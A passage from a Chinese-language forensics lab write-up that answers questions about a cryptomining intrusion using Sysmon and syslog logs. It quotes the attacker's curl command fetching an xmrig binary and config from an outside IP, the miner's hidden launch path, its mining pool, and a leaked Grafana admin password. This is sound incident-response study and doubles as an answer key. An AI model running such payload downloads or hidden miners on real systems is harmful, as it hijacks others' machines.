Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;Data Name=&quot;Protocol&quot;&gt;tcp&lt;/Data&gt;&lt;Data Name=&quot;Initiated&quot;&gt;true&lt;/Data&gt;&lt;Data Name=&quot;SourceIsIpv6&quot;&gt;false&lt;/Data&gt;&lt;Data Name=&quot;SourceIp&quot;&gt;172.31.60.25&lt;/Data&gt;&lt;Data Name=&quot;SourceHostname&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;SourcePort&quot;&gt;42246&lt;/Data&gt;&lt;Data Name=&quot;SourcePortName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;DestinationIsIpv6&quot;&gt;false&lt;/Data&gt;&lt;Data Name=&quot;DestinationIp&quot;&gt;44.204.18.94&lt;/Data&gt;&lt;Data Name=&quot;DestinationHostname&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;DestinationPort&quot;&gt;80&lt;/Data&gt;&lt;Data Name=&quot;DestinationPortName&quot;&gt;-&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:48 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;11&lt;/EventID&gt;&lt;Version&gt;2&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;11&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:48.013810000Z&quot;/&gt;&lt;EventRecordID&gt;76958&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:48.019&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;TargetFilename&quot;&gt;/opt/automation/config.json&lt;/Data&gt;&lt;Data Name=&quot;CreationUtcTime&quot;&gt;2022-11-24 09:59:48.019&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:48 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;5&lt;/EventID&gt;&lt;Version&gt;3&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;5&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:48.015060000Z&quot;/&gt;&lt;EventRecordID&gt;76959&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:48.020&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4093-637f-789d-2406ab550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4005&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/curl&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>看到以下日志</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/opt/automation</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/opt/automation/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="#task-7" class="hash-link" aria-label="Task 7的直接链接" title="Task 7的直接链接">​</a></h2>
<blockquote>
<p>TA 使用哪个程序同时下载了加密挖矿二进制文件和配置文件？</p>
</blockquote>
<p>看上一题</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="#task-8" class="hash-link" aria-label="Task 8的直接链接" title="Task 8的直接链接">​</a></h2>
<blockquote>
<p>我们需要确认 SOC 团队开始收集证据的确切时间，因为报告中没有包含此信息。他们使用与我们林肯系统管理员相同的公网 IP 地址。</p>
</blockquote>
<p>根据这条 <code>syslog</code> 的记录</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 15:01:00 ip-172-31-13-147 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;11&lt;/EventID&gt;&lt;Version&gt;2&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;11&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T15:01:00.508544000Z&quot;/&gt;&lt;EventRecordID&gt;80918&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1349&quot; ThreadID=&quot;1349&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-13-147&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 15:01:00.511&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-8703-637f-30e5-4b6291550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;2355&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/lib/openssh/sftp-server&lt;/Data&gt;&lt;Data Name=&quot;TargetFilename&quot;&gt;/home/ubuntu/Cat-Scale.sh&lt;/Data&gt;&lt;Data Name=&quot;CreationUtcTime&quot;&gt;2022-11-24 15:01:00.511&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;ubuntu&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>这里的时间，指的是开始部署取证脚本的时间，而不是脚本开始执行的时间</p></div></div>
<p>即可定位</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DD/MM/YYYY HH:MM:SS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2022-11-24 15:01:00</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="#task-9" class="hash-link" aria-label="Task 9的直接链接" title="Task 9的直接链接">​</a></h2>
<blockquote>
<p>请确认系统管理员在某些 Grafana 配置文件中留下的密码。</p>
</blockquote>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">\grafana\conf\defaults.ini</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># default admin password, can be changed before first start of grafana, or in profile settings</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">admin_password = f0rela96789!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">f0rela96789!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="#task-10" class="hash-link" aria-label="Task 10的直接链接" title="Task 10的直接链接">​</a></h2>
<blockquote>
<p>当启动 xmrig 时，挖矿线程值设置为多少？</p>
</blockquote>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json -- threads=0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="#task-11" class="hash-link" aria-label="Task 11的直接链接" title="Task 11的直接链接">​</a></h2>
<blockquote>
<p>我们的 CISO 要求获取有关可能使用的挖矿池的其他细节。请确认 TA 使用了哪个（如果有）挖矿池。</p>
</blockquote>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mABOUT        #033[0m#033[1;36mXMRig/6.18.1#033[0m#033[1;37m gcc/5.4.0#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mLIBS         libuv/1.44.1 OpenSSL/1.1.1o hwloc/2.7.1#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mHUGE PAGES   #033[0m#033[1;32msupported#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37m1GB PAGES    #033[0m#033[1;33munavailable#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCPU          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (1)#033[0m #033[1;32m64-bit#033[0m #033[1;32mAES#033[1;31m VM#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0m#033[1;30mL2:#033[0m#033[1;37m0.2 MB#033[0m#033[1;30m L3:#033[0m#033[1;37m30.0 MB#033[0m#033[1;36m 1#033[0mC#033[1;30m/#033[0m#033[1;36m1#033[0mT#033[1;30m NUMA:#033[0m#033[1;36m1#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMEMORY       #033[0m#033[1;36m1.0/1.9#033[0m#033[0;36m GB#033[0m#033[1;30m (54%)#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0mDIMM 0: #033[1;36m2#033[0m#033[0;36m GB #033[0m#033[1;37mRAM @ 0 MHz #033[0m#033[1;30mDIMM 0#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMOTHERBOARD  #033[0m#033[1;37mXen#033[0m - #033[1;37mHVM domU#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mDONATE       #033[0m#033[1;37m5%#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mASSEMBLY     auto:#033[1;32mintel#033[0m#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mPOOL #1      #033[0m#033[1;32mmonero.herominers.com:10191#033[0m algo #033[1;37mrx/0#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCOMMANDS     #033[0m#033[45;1mh#033[0m#033[1;37mashrate, #033[0m#033[45;1mp#033[0m#033[1;37mause, #033[0m#033[45;1mr#033[0m#033[1;37mesume, #033[0m#033[1;37mre#033[0m#033[45m#033[1;37ms#033[0m#033[1;37mults, #033[0m#033[45;1mc#033[0m#033[1;37monnection#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 sysmon: &lt;Event&gt;&lt;System&gt;&lt;Provider Name=&quot;Linux-Sysmon&quot; Guid=&quot;{ff032593-a8d3-4f13-b0d6-01fc615a0f97}&quot;/&gt;&lt;EventID&gt;11&lt;/EventID&gt;&lt;Version&gt;2&lt;/Version&gt;&lt;Level&gt;4&lt;/Level&gt;&lt;Task&gt;11&lt;/Task&gt;&lt;Opcode&gt;0&lt;/Opcode&gt;&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;&lt;TimeCreated SystemTime=&quot;2022-11-24T09:59:49.437492000Z&quot;/&gt;&lt;EventRecordID&gt;77235&lt;/EventRecordID&gt;&lt;Correlation/&gt;&lt;Execution ProcessID=&quot;1109&quot; ThreadID=&quot;1109&quot;/&gt;&lt;Channel&gt;Linux-Sysmon/Operational&lt;/Channel&gt;&lt;Computer&gt;ip-172-31-60-25&lt;/Computer&gt;&lt;Security UserId=&quot;0&quot;/&gt;&lt;/System&gt;&lt;EventData&gt;&lt;Data Name=&quot;RuleName&quot;&gt;-&lt;/Data&gt;&lt;Data Name=&quot;UtcTime&quot;&gt;2022-11-24 09:59:49.442&lt;/Data&gt;&lt;Data Name=&quot;ProcessGuid&quot;&gt;{c9eb4a87-4095-637f-cc0f-ed9df4550000}&lt;/Data&gt;&lt;Data Name=&quot;ProcessId&quot;&gt;4101&lt;/Data&gt;&lt;Data Name=&quot;Image&quot;&gt;/usr/bin/apt-get&lt;/Data&gt;&lt;Data Name=&quot;TargetFilename&quot;&gt;/tmp/fileutl.message.UnyXYC&lt;/Data&gt;&lt;Data Name=&quot;CreationUtcTime&quot;&gt;2022-11-24 09:59:49.442&lt;/Data&gt;&lt;Data Name=&quot;User&quot;&gt;root&lt;/Data&gt;&lt;/EventData&gt;&lt;/Event&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: [2022-11-24 09:59:49#033[1;30m.437#033[0m] #033[1;37m#033[46;1m#033[1;37m config  #033[0m #033[1;37mconfiguration saved to: &quot;/usr/share/.logstxt/config.json&quot;#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mOPENCL       #033[0m#033[1;31mdisabled#033[0m#033[0m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCUDA         #033[0m#033[1;31mdisabled#033[0m#033[0m</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Answer</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">monero.herominers.com</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="#task-12" class="hash-link" aria-label="Task 12的直接链接" title="Task 12的直接链接">​</a></h2>
<blockquote>
<p>我们无法在原始下载位置找到加密挖矿二进制文件和配置文件。TA 将它们移动到文件系统的哪个位置？</p>
</blockquote>
<p>Task 10 就有</p>
